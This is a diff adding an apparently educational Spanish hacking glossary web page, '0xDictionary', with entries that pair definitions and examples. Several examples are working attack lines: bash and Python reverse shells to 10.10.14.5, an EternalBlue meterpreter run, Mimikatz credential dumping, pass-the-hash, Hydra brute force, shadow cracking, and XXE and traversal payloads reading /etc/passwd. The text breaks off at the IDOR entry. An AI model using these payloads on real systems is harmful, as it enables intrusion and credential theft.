@@ -1,0 +1,3347 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>0xDictionary - Diccionario Hacker</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=DM+Sans:wght@400;500;700&family=Space+Grotesk:wght@600;700&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --bg-dark: #0f0f23;
+            --bg-card: #1a1a2e;
+            --bg-hover: #252540;
+            --accent: #00e5ff;
+            --accent-dark: #00b8d4;
+            --accent-glow: rgba(0, 229, 255, 0.2);
+            --text-primary: #ffffff;
+            --text-secondary: #b0b0c8;
+            --text-muted: #6b6b8f;
+            --border: #2a2a45;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'DM Sans', sans-serif;
+            background: var(--bg-dark);
+            color: var(--text-primary);
+            line-height: 1.6;
+            overflow-x: hidden;
+        }
+
+        .bg-animation {
+            position: fixed;
+            width: 100%;
+            height: 100%;
+            top: 0;
+            left: 0;
+            z-index: 0;
+            opacity: 0.03;
+            background-image: 
+                radial-gradient(circle at 20% 50%, rgba(102, 126, 234, 0.5) 0%, transparent 50%),
+                radial-gradient(circle at 80% 80%, rgba(0, 229, 255, 0.5) 0%, transparent 50%),
+                radial-gradient(circle at 40% 20%, rgba(245, 87, 108, 0.5) 0%, transparent 50%);
+            background-size: 100% 100%;
+            animation: bgMove 20s ease infinite;
+        }
+
+        @keyframes bgMove {
+            0%, 100% { transform: scale(1) rotate(0deg); }
+            50% { transform: scale(1.1) rotate(5deg); }
+        }
+
+        .container {
+            max-width: 1400px;
+            margin: 0 auto;
+            padding: 2rem;
+            position: relative;
+            z-index: 1;
+        }
+
+        header {
+            text-align: center;
+            padding: 4rem 2rem 3rem;
+            margin-bottom: 3rem;
+            position: relative;
+        }
+
+        .language-toggle {
+            position: absolute;
+            top: 2rem;
+            right: 2rem;
+            background: var(--bg-card);
+            border: 2px solid var(--border);
+            border-radius: 12px;
+            padding: 0.5rem;
+            display: flex;
+            gap: 0.5rem;
+        }
+
+        .lang-btn {
+            padding: 0.5rem 1rem;
+            background: transparent;
+            border: none;
+            border-radius: 8px;
+            color: var(--text-secondary);
+            font-size: 0.875rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            text-transform: uppercase;
+            font-family: 'DM Sans', sans-serif;
+        }
+
+        .lang-btn:hover {
+            color: var(--accent);
+        }
+
+        .lang-btn.active {
+            background: var(--accent);
+            color: var(--bg-dark);
+        }
+
+        .logo {
+            font-family: 'Space Grotesk', sans-serif;
+            font-size: 4rem;
+            font-weight: 700;
+            background: linear-gradient(135deg, #00e5ff 0%, #667eea 50%, #f5576c 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            margin-bottom: 1rem;
+            letter-spacing: -2px;
+        }
+
+        .tagline {
+            font-size: 1.125rem;
+            color: var(--text-secondary);
+            font-weight: 500;
+        }
+
+        .search-section {
+            max-width: 800px;
+            margin: 0 auto 4rem;
+            display: flex;
+            gap: 1rem;
+            align-items: stretch;
+        }
+
+        .search-wrapper {
+            flex: 1;
+            position: relative;
+        }
+
+        .search-input {
+            width: 100%;
+            padding: 1.25rem 1.5rem 1.25rem 3.5rem;
+            background: var(--bg-card);
+            border: 2px solid var(--border);
+            border-radius: 16px;
+            color: var(--text-primary);
+            font-size: 1rem;
+            font-family: 'DM Sans', sans-serif;
+            transition: all 0.3s ease;
+        }
+
+        .search-input:focus {
+            outline: none;
+            border-color: var(--accent);
+            box-shadow: 0 0 0 4px var(--accent-glow);
+        }
+
+        .search-icon {
+            position: absolute;
+            left: 1.25rem;
+            top: 50%;
+            transform: translateY(-50%);
+            font-size: 1.5rem;
+            color: var(--text-muted);
+        }
+
+        .filter-btn {
+            padding: 1.25rem 2rem;
+            background: var(--bg-card);
+            border: 2px solid var(--border);
+            border-radius: 16px;
+            color: var(--text-primary);
+            font-size: 1rem;
+            font-family: 'DM Sans', sans-serif;
+            font-weight: 500;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+            transition: all 0.3s ease;
+            position: relative;
+        }
+
+        .filter-btn:hover {
+            background: var(--bg-hover);
+            border-color: var(--accent);
+        }
+
+        .filter-btn.active {
+            border-color: var(--accent);
+            background: var(--bg-hover);
+        }
+
+        .filter-count {
+            background: var(--accent);
+            color: var(--bg-dark);
+            font-size: 0.75rem;
+            font-weight: 700;
+            padding: 0.25rem 0.5rem;
+            border-radius: 12px;
+            min-width: 20px;
+            text-align: center;
+        }
+
+        .filter-dropdown {
+            position: absolute;
+            top: calc(100% + 0.5rem);
+            right: 0;
+            background: var(--bg-card);
+            border: 2px solid var(--border);
+            border-radius: 16px;
+            padding: 1.5rem;
+            min-width: 320px;
+            max-height: 400px;
+            overflow-y: auto;
+            display: none;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5);
+            z-index: 100;
+        }
+
+        .filter-dropdown.active {
+            display: block;
+            animation: slideDown 0.3s ease;
+        }
+
+        @keyframes slideDown {
+            from { opacity: 0; transform: translateY(-10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .filter-dropdown h3 {
+            font-size: 0.875rem;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            color: var(--text-muted);
+            margin-bottom: 1rem;
+        }
+
+        .tags-grid {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 0.5rem;
+        }
+
+        .tag-option {
+            padding: 0.5rem 1rem;
+            background: var(--bg-dark);
+            border: 2px solid var(--border);
+            border-radius: 8px;
+            color: var(--text-secondary);
+            font-size: 0.875rem;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            font-weight: 500;
+        }
+
+        .tag-option:hover {
+            border-color: var(--accent);
+            color: var(--accent);
+            transform: translateY(-2px);
+        }
+
+        .tag-option.selected {
+            background: var(--accent);
+            border-color: var(--accent);
+            color: var(--bg-dark);
+        }
+
+        .letter-group {
+            margin-bottom: 4rem;
+        }
+
+        .letter-header {
+            font-family: 'Space Grotesk', sans-serif;
+            font-size: 3rem;
+            font-weight: 700;
+            background: linear-gradient(135deg, #4facfe 0%, #00f2fe 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            margin-bottom: 1.5rem;
+            display: inline-block;
+        }
+
+        .terms-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(380px, 1fr));
+            gap: 1.5rem;
+        }
+
+        .term-card {
+            background: var(--bg-card);
+            border: 2px solid var(--border);
+            border-radius: 20px;
+            padding: 2rem;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .term-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 4px;
+            background: linear-gradient(135deg, #4facfe 0%, #00f2fe 100%);
+            transform: scaleX(0);
+            transform-origin: left;
+            transition: transform 0.3s ease;
+        }
+
+        .term-card:hover {
+            border-color: var(--accent);
+            transform: translateY(-8px);
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.3);
+        }
+
+        .term-card:hover::before {
+            transform: scaleX(1);
+        }
+
+        .term-header {
+            display: flex;
+            align-items: flex-start;
+            justify-content: space-between;
+            margin-bottom: 1rem;
+        }
+
+        .term-title {
+            font-family: 'Space Grotesk', sans-serif;
+            font-size: 1.75rem;
+            font-weight: 700;
+            color: var(--text-primary);
+            line-height: 1.2;
+        }
+
+        .term-category-badge {
+            padding: 0.375rem 0.875rem;
+            border-radius: 8px;
+            font-size: 0.75rem;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            white-space: nowrap;
+        }
+
+        .category-web { background: rgba(102, 126, 234, 0.2); color: #667eea; }
+        .category-herramientas { background: rgba(0, 229, 255, 0.2); color: #00e5ff; }
+        .category-técnicas { background: rgba(245, 87, 108, 0.2); color: #f5576c; }
+        .category-reconocimiento { background: rgba(240, 147, 251, 0.2); color: #f093fb; }
+        .category-defensivas { background: rgba(79, 172, 254, 0.2); color: #4facfe; }
+        .category-conceptos { background: rgba(118, 75, 162, 0.2); color: #764ba2; }
+        .category-social-engineering { background: rgba(255, 107, 107, 0.2); color: #ff6b6b; }
+        .category-malware { background: rgba(255, 159, 67, 0.2); color: #ff9f43; }
+        .category-metodologías { background: rgba(46, 213, 115, 0.2); color: #2ed573; }
+        .category-ataques { background: rgba(255, 71, 87, 0.2); color: #ff4757; }
+        .category-criptografía { background: rgba(87, 96, 111, 0.2); color: #57606f; }
+        .category-redes { background: rgba(30, 144, 255, 0.2); color: #1e90ff; }
+        .category-vulnerabilidad { background: rgba(251, 252, 253, 0.866); color: #6f7174; }
+
+        .category-social-engineering { background: rgba(255, 107, 107, 0.2); color: #ff6b6b; }
+        .category-tools { background: rgba(0, 229, 255, 0.2); color: #00e5ff; }
+        .category-techniques { background: rgba(245, 87, 108, 0.2); color: #f5576c; }
+        .category-reconnaissance { background: rgba(240, 147, 251, 0.2); color: #f093fb; }
+        .category-defensive { background: rgba(79, 172, 254, 0.2); color: #4facfe; }
+        .category-concepts { background: rgba(118, 75, 162, 0.2); color: #764ba2; }
+        .category-attacks { background: rgba(255, 71, 87, 0.2); color: #ff4757; }
+        .category-cryptography { background: rgba(87, 96, 111, 0.2); color: #57606f; }
+        .category-networks { background: rgba(30, 144, 255, 0.2); color: #1e90ff; }
+        .category-vulnerability { background: rgba(251, 252, 253, 0.866); color: #6f7174; }
+        .category-methodologies { background: rgba(46, 213, 115, 0.2); color: #2ed573; }
+
+        .term-definition {
+            color: var(--text-secondary);
+            font-size: 0.9375rem;
+            line-height: 1.7;
+            margin-bottom: 1.25rem;
+        }
+
+        .term-tags {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 0.5rem;
+        }
+
+        .tag {
+            padding: 0.375rem 0.75rem;
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 6px;
+            font-size: 0.8125rem;
+            color: var(--text-muted);
+            font-weight: 500;
+        }
+
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0, 0, 0, 0.92);
+            backdrop-filter: blur(10px);
+            z-index: 1000;
+            overflow-y: auto;
+            padding: 2rem 1rem;
+        }
+
+        .modal.active {
+            display: block;
+            animation: fadeIn 0.3s ease;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+
+        .modal-content {
+            background: var(--bg-card);
+            border: 2px solid var(--border);
+            border-radius: 24px;
+            max-width: 900px;
+            width: 100%;
+            padding: 3rem;
+            position: relative;
+            animation: slideUp 0.4s ease;
+            margin: 2rem auto;
+            min-height: auto;
+        }
+
+        @keyframes slideUp {
+            from { opacity: 0; transform: translateY(50px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .modal-close {
+            position: absolute;
+            top: 1.5rem;
+            right: 1.5rem;
+            background: var(--accent);
+            border: none;
+            width: 50px;
+            height: 50px;
+            border-radius: 12px;
+            color: var(--bg-dark);
+            font-size: 2rem;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 10;
+            line-height: 1;
+        }
+
+        .modal-close:hover {
+            background: #f5576c;
+            transform: scale(1.1);
+        }
+
+        .modal-title {
+            font-family: 'Space Grotesk', sans-serif;
+            font-size: 2.5rem;
+            font-weight: 700;
+            background: linear-gradient(135deg, #4facfe 0%, #00f2fe 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            margin-bottom: 1.5rem;
+            line-height: 1.2;
+            padding-right: 60px;
+        }
+
+        .info-box {
+            background: var(--bg-dark);
+            border: 2px solid var(--border);
+            border-radius: 16px;
+            padding: 1.5rem;
+            margin-bottom: 1.5rem;
+        }
+
+        .info-box h3 {
+            color: var(--accent);
+            font-size: 1rem;
+            font-weight: 700;
+            margin-bottom: 1rem;
+            font-family: 'Space Grotesk', sans-serif;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        .info-box p {
+            color: var(--text-secondary);
+            line-height: 1.8;
+            font-size: 0.9375rem;
+            margin: 0;
+        }
+
+        .info-box .code-block {
+            margin: 0;
+        }
+
+        .code-block {
+            background: var(--bg-dark);
+            border: 1px solid var(--border);
+            border-radius: 12px;
+            padding: 1.5rem;
+            margin: 1.5rem 0;
+            overflow-x: auto;
+            font-family: 'Courier New', monospace;
+        }
+
+        .code-block code {
+            color: var(--accent);
+            font-size: 0.9rem;
+            line-height: 1.6;
+            white-space: pre-wrap;
+        }
+
+        .no-results {
+            text-align: center;
+            padding: 6rem 2rem;
+            color: var(--text-muted);
+        }
+
+        .no-results-icon {
+            font-size: 5rem;
+            margin-bottom: 1.5rem;
+            opacity: 0.3;
+        }
+
+        .no-results h3 {
+            font-size: 1.5rem;
+            margin-bottom: 0.5rem;
+            color: var(--text-secondary);
+        }
+
+        footer {
+            text-align: center;
+            padding: 4rem 2rem;
+            color: var(--text-muted);
+            font-size: 0.875rem;
+            margin-top: 4rem;
+            border-top: 1px solid var(--border);
+        }
+
+        @media (max-width: 768px) {
+            .logo {
+                font-size: 2.5rem;
+            }
+
+            .language-toggle {
+                top: 1rem;
+                right: 1rem;
+            }
+
+            .search-section {
+                flex-direction: column;
+            }
+
+            .filter-dropdown {
+                right: 0;
+                left: 0;
+                min-width: auto;
+            }
+
+            .terms-grid {
+                grid-template-columns: 1fr;
+            }
+
+            .letter-header {
+                font-size: 2rem;
+            }
+
+            .modal {
+                padding: 1rem;
+            }
+
+            .modal-content {
+                padding: 2rem;
+                margin: 1rem auto;
+            }
+
+            .modal-title {
+                font-size: 2rem;
+                padding-right: 50px;
+            }
+
+            .modal-close {
+                top: 1rem;
+                right: 1rem;
+                width: 45px;
+                height: 45px;
+            }
+        }
+
+        ::-webkit-scrollbar {
+            width: 10px;
+        }
+
+        ::-webkit-scrollbar-track {
+            background: var(--bg-dark);
+        }
+
+        ::-webkit-scrollbar-thumb {
+            background: var(--border);
+            border-radius: 5px;
+        }
+
+        ::-webkit-scrollbar-thumb:hover {
+            background: var(--accent);
+        }
+    </style>
+</head>
+<body>
+    <div class="bg-animation"></div>
+
+    <header>
+        <div class="language-toggle">
+            <button class="lang-btn active" onclick="setLanguage('es')" id="langEs">ES</button>
+            <button class="lang-btn" onclick="setLanguage('en')" id="langEn">EN</button>
+        </div>
+        <div class="logo">0xDictionary</div>
+        <div class="tagline" id="tagline">El diccionario definitivo para hackers y pentesters</div>
+    </header>
+
+    <div class="container">
+        <div class="search-section">
+            <div class="search-wrapper">
+                <span class="search-icon">🔍</span>
+                <input 
+                    type="text" 
+                    id="searchInput" 
+                    class="search-input" 
+                    placeholder="Buscar términos, técnicas, herramientas..."
+                >
+            </div>
+            
+            <div style="position: relative;">
+                <button class="filter-btn" id="filterBtn">
+                    <span id="filterText">Filtros</span>
+                    <span class="filter-count" id="filterCount" style="display: none;">0</span>
+                </button>
+                
+                <div class="filter-dropdown" id="filterDropdown">
+                    <h3 id="categoriesText">Categorías</h3>
+                    <div class="tags-grid" id="tagsGrid"></div>
+                </div>
+            </div>
+        </div>
+
+        <div id="contentContainer"></div>
+    </div>
+
+    <footer>
+        <p>0xDictionary - Construido para la comunidad hacker 🔓</p>
+        <p style="margin-top: 0.5rem;">Open source • Educativo • Sin censura</p>
+    </footer>
+
+    <div class="modal" id="termModal">
+        <div class="modal-content">
+            <button class="modal-close" onclick="closeModal()">×</button>
+            <div id="modalBody"></div>
+        </div>
+    </div>
+
+    <script>
+        // Términos con traducciones
+        const termsData = {
+            es: [
+            {
+                title: "Nmap",
+                slug: "nmap",
+                category: "Herramientas",
+                tags: ["herramientas", "redes", "escaneo", "reconocimiento"],
+                definition: "Network Mapper - Herramienta de código abierto para exploración de redes y auditorías de seguridad.",
+                explanation: "Permite descubrir hosts activos en una red, identificar puertos abiertos, determinar servicios y versiones en ejecución, y detectar sistemas operativos. Utiliza diversos tipos de escaneo (TCP SYN, TCP Connect, UDP, etc.) y puede ejecutar scripts NSE (Nmap Scripting Engine) para detección de vulnerabilidades específicas. Es la herramienta estándar para la fase de reconocimiento en pentesting.",
+                example: `nmap -sS -sV -O 192.168.1.0/24
+nmap -p- --min-rate 10000 target.com
+nmap --script vuln target.com`,
+                importance: "Fundamental en cualquier auditoría de seguridad, permite mapear la superficie de ataque y es el primer paso en la mayoría de pruebas de penetración. Su versatilidad y precisión la hacen indispensable."
+            },
+            {
+                title: "Burp Suite",
+                slug: "burp-suite",
+                category: "Herramientas",
+                tags: ["herramientas", "web", "proxy", "testing"],
+                definition: "Plataforma integrada para realizar pruebas de seguridad en aplicaciones web.",
+                explanation: "Funciona como un proxy interceptor que permite analizar y modificar el tráfico HTTP/HTTPS entre el navegador y el servidor. Incluye módulos como Spider (rastreo automático), Scanner (detección de vulnerabilidades), Intruder (ataques automatizados), Repeater (modificación manual de peticiones) y Decoder/Comparer para análisis de datos. La versión Professional añade escaneo automático avanzado.",
+                example: `1. Configura proxy en navegador (127.0.0.1:8080)
+2. Intercepta petición en Proxy > Intercept
+3. Send to Repeater para modificar
+4. Send to Intruder para fuzzing`,
+                importance: "Es el estándar de facto en pentesting web. Permite identificar y explotar la mayoría de vulnerabilidades web de forma eficiente, tanto manual como automatizada."
+            },
+            {
+                title: "Metasploit",
+                slug: "metasploit",
+                category: "Herramientas",
+                tags: ["herramientas", "explotación", "framework", "pentesting"],
+                definition: "Framework de penetración que proporciona información sobre vulnerabilidades y facilita el desarrollo y ejecución de exploits.",
+                explanation: "Incluye una extensa base de datos de exploits públicos, payloads, encoders y módulos auxiliares. Permite automatizar muchas fases del pentesting, desde reconocimiento hasta post-explotación. Utiliza un lenguaje de módulos en Ruby y ofrece interfaces tanto CLI (msfconsole) como GUI. Integra herramientas como meterpreter, un payload avanzado que permite control completo del sistema comprometido.",
+                example: `msfconsole
+use exploit/windows/smb/ms17_010_eternalblue
+set RHOSTS 192.168.1.100
+set payload windows/x64/meterpreter/reverse_tcp
+set LHOST 192.168.1.50
+exploit`,
+                importance: "Acelera dramáticamente el proceso de explotación y es esencial para validar la criticidad real de las vulnerabilidades encontradas. Su biblioteca de exploits se actualiza constantemente."
+            },
+            {
+                title: "Reverse Shell",
+                slug: "reverse-shell",
+                category: "Técnicas",
+                tags: ["técnicas", "explotación", "persistencia"],
+                definition: "Conexión shell inversa donde la máquina comprometida se conecta de vuelta al atacante.",
+                explanation: "A diferencia de un bind shell (que abre un puerto en la víctima), la reverse shell hace que la víctima inicie la conexión hacia el atacante. Esto es útil para evadir firewalls, ya que las conexiones salientes suelen estar menos restringidas. Se puede implementar en múltiples lenguajes (bash, python, netcat, powershell) y es una de las técnicas más comunes en post-explotación.",
+                example: `# Atacante escucha
+nc -lvnp 4444
+
+# Víctima se conecta (bash)
+bash -i >& /dev/tcp/10.10.14.5/4444 0>&1
+
+# Python
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.5",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);'`,
+                importance: "Proporciona acceso remoto al sistema comprometido de forma sigilosa. Es el objetivo común tras explotar una vulnerabilidad inicial y permite ejecutar comandos, subir archivos y mantener persistencia."
+            },
+            {
+                title: "Privilege Escalation",
+                slug: "privilege-escalation",
+                category: "Técnicas",
+                tags: ["técnicas", "explotación", "linux", "windows"],
+                definition: "Proceso de obtener privilegios superiores a los inicialmente otorgados en un sistema comprometido.",
+                explanation: "Tras obtener acceso inicial (usualmente como usuario de bajos privilegios), el objetivo es escalar a root/SYSTEM. Las técnicas incluyen: explotación de kernel vulnerables, binarios SUID mal configurados, tareas programadas inseguras, credenciales hardcodeadas, permisos de sudo incorrectos, y servicios mal configurados. Herramientas como LinPEAS, WinPEAS automatizan la búsqueda de vectores de escalación.",
+                example: `# Buscar binarios SUID
+find / -perm -4000 2>/dev/null
+
+# Sudo mal configurado
+sudo -l
+sudo /usr/bin/vim -c ':!/bin/sh'
+
+# Kernel exploit
+uname -a
+searchsploit linux kernel 4.4.0`,
+                importance: "Convertir un acceso limitado en control total del sistema es crucial para la exfiltración de datos sensibles, instalación de backdoors persistentes y movimiento lateral en la red."
+            },
+            {
+                title: "Directory Traversal",
+                slug: "directory-traversal",
+                category: "Web",
+                tags: ["web", "vulnerabilidad", "file-inclusion"],
+                definition: "Vulnerabilidad que permite acceder a archivos y directorios fuera del directorio raíz del servidor web.",
+                explanation: "También conocido como Path Traversal, explota la falta de validación en rutas de archivos. Usando secuencias como '../' (dot-dot-slash), un atacante puede navegar hacia arriba en la estructura de directorios y acceder a archivos sensibles del sistema como /etc/passwd, configuraciones de aplicaciones, archivos de log, o código fuente. Las variantes incluyen codificación URL, Unicode, y doble codificación para evadir filtros.",
+                example: `https://ejemplo.com/archivo?path=../../../../etc/passwd
+
+# URL encoded
+..%2f..%2f..%2fetc%2fpasswd
+
+# Double encoded
+..%252f..%252f..%252fetc%252fpasswd`,
+                importance: "Puede exponer información crítica del sistema, credenciales, código fuente, y claves privadas. En combinación con otras vulnerabilidades, puede llevar a RCE (Remote Code Execution)."
+            },
+            {
+                title: "2FA",
+                slug: "2fa",
+                category: "Defensivas",
+                tags: ["defensivas", "autenticación", "seguridad"],
+                definition: "Two-Factor Authentication - Método de autenticación que requiere dos factores diferentes para verificar la identidad del usuario.",
+                explanation: "Combina algo que sabes (contraseña) con algo que tienes (dispositivo físico, app de autenticación) o algo que eres (biometría). Los métodos comunes incluyen: TOTP (Time-based One-Time Password como Google Authenticator), SMS (menos seguro), hardware tokens (YubiKey), y notificaciones push. Mitiga ataques de phishing y robo de credenciales, aunque métodos como SMS son vulnerables a SIM swapping.",
+                example: `# Configurar TOTP
+1. Escanear QR code con Google Authenticator
+2. Introducir código de 6 dígitos
+3. Guardar códigos de backup
+
+# Bypass común: Session fixation, OAuth misconfiguration`,
+                importance: "Reduce drásticamente el riesgo de compromiso de cuentas. Incluso si se roban las credenciales, el atacante necesita el segundo factor. Es una defensa fundamental recomendada para todos los servicios críticos."
+            },
+            {
+                title: "0day",
+                slug: "0day",
+                category: "Conceptos",
+                tags: ["conceptos", "vulnerabilidad", "exploits"],
+                definition: "Vulnerabilidad desconocida públicamente y sin parche disponible, o exploit usado antes de que exista una solución.",
+                explanation: "El término 'día cero' se refiere a que los desarrolladores tienen cero días para corregir la vulnerabilidad antes de que sea explotada. Son extremadamente valiosas en el mercado negro y clandestino (pueden venderse por millones de dólares). Los exploits 0day son utilizados por APTs (Advanced Persistent Threats), agencias gubernamentales y cibercriminales sofisticados.",
+                example: `Ejemplos históricos:
+- EternalBlue (NSA, usado en WannaCry)
+- Stuxnet (múltiples 0days contra SCADA)
+- Pegasus (0days de iOS/Android)
+
+Mercado: $100k - $5M dependiendo del objetivo`,
+                importance: "Representan el nivel más alto de amenaza porque no existe defensa directa. Las organizaciones solo pueden mitigarse con defensa en profundidad, detección de anomalías y respuesta rápida a incidentes."
+            },
+            {
+                title: "Phishing",
+                slug: "phishing",
+                category: "Social Engineering",
+                tags: ["social-engineering", "ataque", "credenciales"],
+                definition: "Técnica de ingeniería social que busca engañar a las víctimas para que revelen información sensible o ejecuten acciones maliciosas.",
+                explanation: "Típicamente mediante correos electrónicos, SMS (smishing) o llamadas (vishing) que se hacen pasar por entidades legítimas. Los ataques van desde campañas masivas genéricas hasta spear phishing (dirigido a individuos específicos) y whaling (dirigido a ejecutivos). Técnicas avanzadas incluyen clonación de sitios, uso de dominios similares (typosquatting), y abuso de servicios legítimos para hosting.",
+                example: `Correo falso:
+De: seguridad@banc0.com (nota el cero)
+Asunto: Suspensión de cuenta - Acción requerida
+
+Sitio clonado:
+https://login-microsoft.com.secure-verify.tk`,
+                importance: "Sigue siendo uno de los vectores de ataque más efectivos (>90% de brechas comienzan con phishing). Requiere poca habilidad técnica pero gran habilidad social. Es la puerta de entrada común para ransomware y APTs."
+            },
+            {
+                title: "OSINT",
+                slug: "osint",
+                category: "Reconocimiento",
+                tags: ["reconocimiento", "inteligencia", "pasivo"],
+                definition: "Open Source Intelligence - Recopilación de información a partir de fuentes públicamente disponibles.",
+                explanation: "Incluye búsqueda en motores, redes sociales, bases de datos públicas, registros DNS/WHOIS, GitHub, paste sites, certificados SSL, y más. Herramientas como theHarvester, Maltego, Shodan, y Recon-ng automatizan este proceso. Es una fase crítica de reconocimiento pasivo que no genera tráfico hacia el objetivo, minimizando el riesgo de detección.",
+                example: `# theHarvester
+theHarvester -d ejemplo.com -b all
+
+# Shodan
+shodan search org:"Empresa Target"
+
+# Google Dorking
+site:ejemplo.com filetype:pdf`,
+                importance: "Proporciona información valiosa sin alertar al objetivo: empleados, tecnologías usadas, infraestructura, filtraciones de datos previas, superficie de ataque externa. Es legal y ético en la mayoría de contextos."
+            },
+            {
+                title: "Lateral Movement",
+                slug: "lateral-movement",
+                category: "Técnicas",
+                tags: ["técnicas", "post-explotación", "redes"],
+                definition: "Técnicas para moverse entre sistemas dentro de una red después de la compromisión inicial.",
+                explanation: "Tras comprometer un sistema, los atacantes pivotan hacia otros hosts para alcanzar objetivos de alto valor. Técnicas comunes: Pass-the-Hash, Pass-the-Ticket (Kerberos), abuso de SMB/WMI/PsExec, uso de credenciales robadas, y explotación de confianzas entre sistemas. Herramientas como Mimikatz, CrackMapExec e Impacket facilitan este movimiento.",
+                example: `# Pass-the-Hash con CrackMapExec
+crackmapexec smb 192.168.1.0/24 -u Administrator -H <HASH>
+
+# PsExec
+psexec.py DOMAIN/user@target cmd.exe
+
+# Mimikatz
+mimikatz.exe "sekurlsa::logonpasswords"`,
+                importance: "Es cómo los atacantes van desde un punto de entrada de bajo valor hasta los sistemas críticos (Domain Controllers, bases de datos, sistemas financieros). Esencial tanto para atacantes como para Red Teams."
+            },
+            {
+                title: "Wireshark",
+                slug: "wireshark",
+                category: "Herramientas",
+                tags: ["herramientas", "redes", "análisis", "forense"],
+                definition: "Analizador de protocolos de red open source que permite capturar y examinar tráfico de red en detalle.",
+                explanation: "Funciona capturando paquetes de red en tiempo real y permitiendo inspección profunda de cientos de protocolos. Útil para análisis forense, troubleshooting de red, detección de malware, análisis de tráfico cifrado (con claves), y debugging de aplicaciones de red. Soporta filtros complejos (BPF y display filters) para aislar tráfico específico.",
+                example: `# Capturar tráfico HTTP
+http.request.method == "POST"
+
+# Ver credenciales en claro
+http contains "password"
+
+# Filtrar por IP
+ip.addr == 192.168.1.100`,
+                importance: "Fundamental para entender comunicaciones de red, identificar tráfico malicioso, extraer archivos transferidos, y analizar protocolos propietarios. Es indispensable en análisis forense y respuesta a incidentes."
+            },
+            {
+                title: "John the Ripper",
+                slug: "john-the-ripper",
+                category: "Herramientas",
+                tags: ["herramientas", "cracking", "password"],
+                definition: "Herramienta de auditoría de contraseñas y cracking de hashes extremadamente versátil y rápida.",
+                explanation: "Soporta cientos de formatos de hash (MD5, SHA, bcrypt, NTLM, etc.) y tipos de cifrado. Incluye modos de ataque: diccionario, fuerza bruta, incremental, y reglas para mutación de palabras. La versión community (Jumbo) añade soporte para formatos adicionales. Puede aprovechar GPU para acelerar dramáticamente el cracking.",
+                example: `# Crack de archivo /etc/shadow
+unshadow /etc/passwd /etc/shadow > hashes.txt
+john --wordlist=rockyou.txt hashes.txt
+
+# Usar reglas
+john --wordlist=dict.txt --rules hashes.txt`,
+                importance: "Las contraseñas débiles son una de las principales vulnerabilidades. John permite auditar la fortaleza de contraseñas en una organización y es esencial para completar la cadena de ataque tras obtener hashes."
+            },
+            {
+                title: "Hydra",
+                slug: "hydra",
+                category: "Herramientas",
+                tags: ["herramientas", "bruteforce", "password", "redes"],
+                definition: "Herramienta de ataque de fuerza bruta para credenciales en servicios de red.",
+                explanation: "Soporta más de 50 protocolos incluyendo SSH, FTP, HTTP(S), SMB, RDP, SMTP, MySQL, PostgreSQL, etc. Permite ataques con diccionarios, combinaciones de usuarios/contraseñas, y puede realizar ataques paralelos para mayor velocidad. Es altamente configurable en términos de número de threads, timeouts, y condiciones de éxito/fallo.",
+                example: `# SSH bruteforce
+hydra -l admin -P passwords.txt ssh://192.168.1.100
+
+# HTTP POST form
+hydra -l admin -P pass.txt 192.168.1.100 http-post-form "/login:username=^USER^&password=^PASS^:Invalid"`,
+                importance: "Las credenciales por defecto y contraseñas débiles siguen siendo una puerta de entrada común. Hydra permite identificar rápidamente estos casos en auditorías de seguridad y pruebas de penetración."
+            },
+            {
+                title: "XXE",
+                slug: "xxe",
+                category: "Web",
+                tags: ["web", "vulnerabilidad", "xml", "injection"],
+                definition: "XML External Entity - Vulnerabilidad que permite a un atacante interferir con el procesamiento de datos XML de una aplicación.",
+                explanation: "Ocurre cuando un parser XML mal configurado procesa entidades externas definidas en el documento XML. Esto puede permitir: lectura de archivos locales del servidor, SSRF (Server-Side Request Forgery) para escanear redes internas, DoS mediante billion laughs attack, y en casos extremos RCE. La explotación se basa en definir entidades XML que el parser expandirá.",
+                example: `<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<data>&xxe;</data>
+
+<!-- SSRF -->
+<!ENTITY xxe SYSTEM "http://interno.local/secret">`,
+                importance: "Puede exponer archivos críticos del sistema, código fuente, configuraciones, y credenciales. El SSRF resultante puede comprometer redes internas completas. Aparece en APIs que procesan XML, SAML, y formatos basados en XML."
+            },
+            {
+                title: "IDOR",
+                slug: "idor",
